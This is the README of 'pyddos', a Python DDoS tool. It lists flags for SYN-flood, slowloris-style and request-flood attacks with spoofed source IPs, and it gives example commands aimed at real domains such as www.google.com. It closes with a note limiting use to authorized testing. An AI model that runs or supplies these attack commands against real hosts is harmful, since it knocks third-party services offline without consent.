# Pyddos

pyddos is a Python-based DDoS (Distributed Denial of Service) tool created by ghosthets and the Citadel ♈ group. This tool is designed to launch powerful and potentially harmful DDoS attacks against chosen targets, overloading their servers with an overwhelming amount of traffic and ultimately causing them to crash or become unresponsive.

# Requires module
* termcolor
* colorama
* good internet network
* device should be connected internet
* No hardware connection 

# Usage
                               
        DDos python script | Script used for testing ddos | Ddos attack     
         Author: ghosthets and citadel ♈                                              
         Github: http://github.com/ghosthets/pyddos                             
        Version:3.0 

    usage: python3 pyddos.py -t [target] -p [port] -t [number threads]

    optional arguments:
    -h, --help       show this help message and exit
    -v, --version    show program's version number and exit

    options:

    -d <ip|domain>   Specify your target such an ip or domain name
    -t <float>       Set timeout for socket
    -T <int>         Set threads number for connection (default = 1000)
    -p <int>         Specify port target (default = 80) |Only required with pyslow attack|
    -s <int>         Set sleep time for reconnection
    -i <ip address>  Specify spoofed ip unless use fake ip
    -Request         Enable request target
    -Synflood        Enable synflood attack
    -Pyslow          Enable pyslow attack
    --fakeip         Option to create fake ip if not specify spoofed ip

    Example:
        python3 pyddos.py -d www.example.com -p 80 -T 2000 -Pyslow
        python3 pyddos.py -d www.domain.com -s 100 -Request
        python3 pyddos.py -d www.google.com -Synflood -T 5000 -t 10.0
        


# note

Using PyDDOS or any other DDoS tool for malicious purposes is illegal and unethical. This tool should only be used for legitimate security testing purposes and under the authorization of the target system's owner.
